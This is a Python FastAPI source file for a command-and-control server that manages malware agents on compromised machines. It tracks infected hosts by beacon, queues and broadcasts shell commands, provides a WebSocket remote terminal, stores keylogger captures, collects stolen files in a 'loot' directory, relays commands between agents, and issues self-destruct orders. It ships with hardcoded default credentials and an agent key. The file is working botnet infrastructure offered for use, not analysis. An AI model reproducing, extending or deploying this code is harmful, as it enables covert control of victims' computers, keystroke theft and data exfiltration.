import asyncio
import base64
import hashlib
import hmac
import json
import os
import secrets
import sqlite3
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, Optional, Set

import jwt
import uvicorn
from fastapi import (
    Depends,
    FastAPI,
    File,
    Form,
    Header,
    HTTPException,
    Request,
    UploadFile,
    WebSocket,
    WebSocketDisconnect,
)
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

SECRET = os.environ.get("C2_SECRET", secrets.token_hex(64))
ADMIN_USER = os.environ.get("C2_USER", "8n Dev")
ADMIN_PASS = os.environ.get("C2_PASS", "0120779313001225366247")
AGENT_KEY = os.environ.get("AGENT_KEY", "7c4a8d09ca3762af61e59520943dc26494f8941b")
HOST = os.environ.get("C2_HOST", "0.0.0.0")
PORT = int(os.environ.get("C2_PORT", "8443"))
DB_PATH = Path(__file__).parent / "c2.db"
LOOT_DIR = Path(__file__).parent / "loot"
LOOT_DIR.mkdir(exist_ok=True)

app = FastAPI(docs_url=None, redoc_url=None)
templates = Jinja2Templates(directory=str(Path(__file__).parent / "templates"))
app.mount("/static", StaticFiles(directory=str(Path(__file__).parent / "static")), name="static")

ws_terminals: Dict[str, Set[WebSocket]] = {}
pending_cmds: Dict[str, list] = {}
cmd_results: Dict[str, list] = {}
online_agents: Dict[str, float] = {}


def db():
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    con.execute("PRAGMA journal_mode=WAL")
    con.execute("PRAGMA foreign_keys=ON")
    return con


def init_db():
    con = db()
    con.executescript(
        """
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            os TEXT,
            arch TEXT,
            ip TEXT,
            internal_ip TEXT,
            mac TEXT,
            cpu TEXT,
            ram TEXT,
            is_vm INTEGER DEFAULT 0,
            is_admin INTEGER DEFAULT 0,
            first_seen TEXT,
            last_seen TEXT,
            status TEXT DEFAULT 'offline',
            notes TEXT DEFAULT '',
            geo TEXT DEFAULT '',
            group_name TEXT DEFAULT 'default',
            version TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS tasks (
            id TEXT PRIMARY KEY,
            agent_id TEXT,
            cmd_type TEXT,
            payload TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            created_at TEXT,
            completed_at TEXT
        );
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            event_type TEXT,
            data TEXT,
            ts TEXT
        );
        CREATE TABLE IF NOT EXISTS files_meta (
            id TEXT PRIMARY KEY,
            agent_id TEXT,
            path TEXT,
            size INTEGER,
            saved_as TEXT,
            ts TEXT
        );
        CREATE TABLE IF NOT EXISTS keylog (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            data TEXT,
            ts TEXT
        );
        """
    )
    con.commit()
    con.close()


def make_token(sub: str, hours: int = 24) -> str:
    return jwt.encode(
        {"sub": sub, "exp": int(time.time()) + hours * 3600, "jti": secrets.token_hex(8)},
        SECRET,
        algorithm="HS256",
    )


def verify_token(auth: Optional[str] = Header(None, alias="Authorization")):
    if not auth or not auth.startswith("Bearer "):
        raise HTTPException(401, "unauthorized")
    try:
        data = jwt.decode(auth.split(" ", 1)[1], SECRET, algorithms=["HS256"])
        return data["sub"]
    except Exception:
        raise HTTPException(401, "unauthorized")


def verify_agent(x_agent_key: Optional[str] = Header(None), x_agent_id: Optional[str] = Header(None)):
    if not x_agent_key or not hmac.compare_digest(x_agent_key, AGENT_KEY):
        raise HTTPException(403, "forbidden")
    if not x_agent_id:
        raise HTTPException(400, "missing agent id")
    return x_agent_id


def now_iso():
    return datetime.now(timezone.utc).isoformat()


@app.on_event("startup")
async def startup():
    init_db()


@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})


@app.get("/api/health")
async def health():
    return {"status": "ok", "ts": now_iso(), "agents": len(online_agents)}


@app.post("/api/auth/login")
async def login(username: str = Form(...), password: str = Form(...)):
    if not (hmac.compare_digest(username.strip(), ADMIN_USER.strip()) and hmac.compare_digest(password, ADMIN_PASS)):
        raise HTTPException(401, "bad credentials")
    return {"token": make_token(username), "user": username.strip()}


@app.get("/api/agents")
async def list_agents(_: str = Depends(verify_token)):
    con = db()
    rows = con.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    con.close()
    out = []
    for r in rows:
        d = dict(r)
        aid = d["id"]
        last = online_agents.get(aid, 0)
        d["online"] = (time.time() - last) < 55
        d["status"] = "online" if d["online"] else "offline"
        d["last_beacon"] = int(last) if last else 0
        out.append(d)
    return out


@app.get("/api/agents/{agent_id}")
async def get_agent(agent_id: str, _: str = Depends(verify_token)):
    con = db()
    row = con.execute("SELECT * FROM agents WHERE id=?", (agent_id,)).fetchone()
    if not row:
        con.close()
        raise HTTPException(404)
    d = dict(row)
    d["online"] = (time.time() - online_agents.get(agent_id, 0)) < 55
    events = con.execute(
        "SELECT * FROM events WHERE agent_id=? ORDER BY id DESC LIMIT 200", (agent_id,)
    ).fetchall()
    tasks = con.execute(
        "SELECT * FROM tasks WHERE agent_id=? ORDER BY created_at DESC LIMIT 100", (agent_id,)
    ).fetchall()
    files = con.execute(
        "SELECT * FROM files_meta WHERE agent_id=? ORDER BY ts DESC LIMIT 100", (agent_id,)
    ).fetchall()
    keys = con.execute(
        "SELECT * FROM keylog WHERE agent_id=? ORDER BY id DESC LIMIT 500", (agent_id,)
    ).fetchall()
    con.close()
    return {
        "agent": d,
        "events": [dict(e) for e in events],
        "tasks": [dict(t) for t in tasks],
        "files": [dict(f) for f in files],
        "keylog": [dict(k) for k in keys],
    }


@app.post("/api/agents/{agent_id}/task")
async def create_task(agent_id: str, request: Request, _: str = Depends(verify_token)):
    body = await request.json()
    cmd_type = body.get("type", "shell")
    payload = body.get("payload", "")
    tid = secrets.token_hex(10)
    con = db()
    con.execute(
        "INSERT INTO tasks(id,agent_id,cmd_type,payload,status,created_at) VALUES(?,?,?,?,?,?)",
        (tid, agent_id, cmd_type, payload, "pending", now_iso()),
    )
    con.commit()
    con.close()
    pending_cmds.setdefault(agent_id, []).append(
        {"id": tid, "type": cmd_type, "payload": payload}
    )
    return {"task_id": tid}


@app.post("/api/agents/broadcast")
async def broadcast_task(request: Request, _: str = Depends(verify_token)):
    body = await request.json()
    cmd_type = body.get("type", "shell")
    payload = body.get("payload", "")
    group = body.get("group", "")
    con = db()
    if group:
        rows = con.execute("SELECT id FROM agents WHERE group_name=? AND status='online'", (group,)).fetchall()
    else:
        rows = con.execute("SELECT id FROM agents WHERE status='online'").fetchall()
    con.close()
    ids = []
    for r in rows:
        aid = r["id"]
        tid = secrets.token_hex(10)
        ids.append(tid)
        con = db()
        con.execute(
            "INSERT INTO tasks(id,agent_id,cmd_type,payload,status,created_at) VALUES(?,?,?,?,?,?)",
            (tid, aid, cmd_type, payload, "pending", now_iso()),
        )
        con.commit()
        con.close()
        pending_cmds.setdefault(aid, []).append(
            {"id": tid, "type": cmd_type, "payload": payload}
        )
    return {"sent": len(ids), "tasks": ids}


@app.delete("/api/agents/{agent_id}")
async def delete_agent(agent_id: str, _: str = Depends(verify_token)):
    tid = secrets.token_hex(10)
    pending_cmds.setdefault(agent_id, []).append(
        {"id": tid, "type": "self_destruct", "payload": ""}
    )
    con = db()
    con.execute(
        "INSERT INTO tasks(id,agent_id,cmd_type,payload,status,created_at) VALUES(?,?,?,?,?,?)",
        (tid, agent_id, "self_destruct", "", "pending", now_iso()),
    )
    con.execute("DELETE FROM agents WHERE id=?", (agent_id,))
    con.execute("DELETE FROM tasks WHERE agent_id=?", (agent_id,))
    con.execute("DELETE FROM events WHERE agent_id=?", (agent_id,))
    con.execute("DELETE FROM files_meta WHERE agent_id=?", (agent_id,))
    con.execute("DELETE FROM keylog WHERE agent_id=?", (agent_id,))
    con.commit()
    con.close()
    online_agents.pop(agent_id, None)
    pending_cmds.pop(agent_id, None)
    return {"ok": True}


@app.get("/api/loot/{file_id}")
async def get_loot(file_id: str, _: str = Depends(verify_token)):
    con = db()
    row = con.execute("SELECT * FROM files_meta WHERE id=?", (file_id,)).fetchone()
    con.close()
    if not row:
        raise HTTPException(404)
    path = LOOT_DIR / row["saved_as"]
    if not path.exists():
        raise HTTPException(404)
    return FileResponse(path, filename=os.path.basename(row["path"]), media_type="application/octet-stream")


@app.get("/api/events")
async def get_events(limit: int = 100, _: str = Depends(verify_token)):
    con = db()
    rows = con.execute("SELECT * FROM events ORDER BY id DESC LIMIT ?", (limit,)).fetchall()
    con.close()
    return [dict(r) for r in rows]


@app.get("/api/keylog/{agent_id}")
async def get_keylog(agent_id: str, _: str = Depends(verify_token)):
    con = db()
    rows = con.execute("SELECT * FROM keylog WHERE agent_id=? ORDER BY id DESC LIMIT 1000", (agent_id,)).fetchall()
    con.close()
    return [dict(r) for r in rows]


@app.websocket("/ws/term/{agent_id}")
async def ws_term(websocket: WebSocket, agent_id: str, token: str):
    try:
        jwt.decode(token, SECRET, algorithms=["HS256"])
    except Exception:
        await websocket.close(code=4401)
        return
    await websocket.accept()
    ws_terminals.setdefault(agent_id, set()).add(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            msg = json.loads(data)
            cmd = msg.get("cmd", "")
            tid = secrets.token_hex(10)
            pending_cmds.setdefault(agent_id, []).append(
                {"id": tid, "type": "shell", "payload": cmd}
            )
            con = db()
            con.execute(
                "INSERT INTO tasks(id,agent_id,cmd_type,payload,status,created_at) VALUES(?,?,?,?,?,?)",
                (tid, agent_id, "shell", cmd, "pending", now_iso()),
            )
            con.commit()
            con.close()
            for _ in range(200):
                await asyncio.sleep(0.3)
                results = cmd_results.get(agent_id, [])
                hit = next((r for r in results if r.get("id") == tid), None)
                if hit:
                    cmd_results[agent_id] = [r for r in results if r.get("id") != tid]
                    await websocket.send_text(
                        json.dumps({"id": tid, "output": hit.get("output", "")})
                    )
                    break
            else:
                await websocket.send_text(
                    json.dumps({"id": tid, "output": "[command timeout - agent may be offline]>"})
                )
    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        ws_terminals.get(agent_id, set()).discard(websocket)


@app.post("/a/beacon")
async def agent_beacon(request: Request, agent_id: str = Depends(verify_agent)):
    try:
        body = await request.json()
    except Exception:
        raise HTTPException(400, "invalid json")
    online_agents[agent_id] = time.time()
    con = db()
    exists = con.execute("SELECT id FROM agents WHERE id=?", (agent_id,)).fetchone()
    fields = (
        body.get("hostname", ""),
        body.get("username", ""),
        body.get("os", ""),
        body.get("arch", ""),
        request.client.host if request.client else "",
        body.get("internal_ip", ""),
        body.get("mac", ""),
        body.get("cpu", ""),
        body.get("ram", ""),
        1 if body.get("is_vm") else 0,
        1 if body.get("is_admin") else 0,
        body.get("version", ""),
        now_iso(),
    )
    if exists:
        con.execute(
            """UPDATE agents SET hostname=?,username=?,os=?,arch=?,ip=?,internal_ip=?,
               mac=?,cpu=?,ram=?,is_vm=?,is_admin=?,version=?,last_seen=?,status='online' WHERE id=?""",
            (*fields, agent_id),
        )
        if body.get("log"):
            log = body["log"]
            if len(log) > 20000:
                log = log[-20000:]
            con.execute(
                "INSERT INTO keylog(agent_id,data,ts) VALUES(?,?,?)",
                (agent_id, str(log), now_iso()),
            )
    else:
        con.execute(
            """INSERT INTO agents(id,hostname,username,os,arch,ip,internal_ip,mac,cpu,ram,
               is_vm,is_admin,version,first_seen,last_seen,status)
               VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,'online')""",
            (agent_id, *fields[:-1], fields[-1]),
        )
        con.execute(
            "INSERT INTO events(agent_id,event_type,data,ts) VALUES(?,?,?,?)",
            (agent_id, "checkin", json.dumps(body), now_iso()),
        )
    con.commit()
    con.close()
    cmds = pending_cmds.pop(agent_id, [])
    return {"cmds": cmds, "peers": list(online_agents.keys())[:64], "interval": 30 if not body.get("is_vm") else 90}


@app.post("/a/result")
async def agent_result(request: Request, agent_id: str = Depends(verify_agent)):
    try:
        body = await request.json()
    except Exception:
        raise HTTPException(400, "invalid json")
    tid = body.get("id", "")
    output = body.get("output", "")
    status = body.get("status", "done")
    con = db()
    con.execute(
        "UPDATE tasks SET status=?, result=?, completed_at=? WHERE id=?",
        (status, output[:500000], now_iso(), tid),
    )
    con.execute(
        "INSERT INTO events(agent_id,event_type,data,ts) VALUES(?,?,?,?)",
        (agent_id, "result", json.dumps({"id": tid, "status": status}), now_iso()),
    )
    con.commit()
    con.close()
    cmd_results.setdefault(agent_id, []).append({"id": tid, "output": output})
    for ws in list(ws_terminals.get(agent_id, set())):
        try:
            await ws.send_text(json.dumps({"id": tid, "output": output}))
        except Exception:
            pass
    return {"ok": True}


@app.post("/a/upload")
async def agent_upload(
    agent_id: str = Depends(verify_agent),
    path: str = Form(...),
    f: UploadFile = File(...),
):
    fid = secrets.token_hex(10)
    raw = await f.read()
    saved = f"{agent_id}_{fid}.bin"
    (LOOT_DIR / saved).write_bytes(raw)
    con = db()
    con.execute(
        "INSERT INTO files_meta(id,agent_id,path,size,saved_as,ts) VALUES(?,?,?,?,?,?)",
        (fid, agent_id, path, len(raw), saved, now_iso()),
    )
    con.execute(
        "INSERT INTO events(agent_id,event_type,data,ts) VALUES(?,?,?,?)",
        (agent_id, "file_upload", json.dumps({"path": path, "size": len(raw)}), now_iso()),
    )
    con.commit()
    con.close()
    return {"ok": True, "id": fid}


@app.post("/a/p2p")
async def agent_p2p(request: Request, agent_id: str = Depends(verify_agent)):
    try:
        body = await request.json()
    except Exception:
        return {"cmds": []}
    target = body.get("for_agent")
    if not target:
        return {"cmds": []}
    cmds = pending_cmds.get(target, [])
    if cmds:
        pending_cmds[target] = []
    return {"cmds": cmds, "from": agent_id}


if __name__ == "__main__":
    init_db()
    print(f"[*] C2 starting on {HOST}:{PORT}")
    print(f"[*] Username: {ADMIN_USER}")
    print(f"[*] Login at http://{HOST}:{PORT}")
    uvicorn.run(app, host=HOST, port=PORT, log_level="warning")
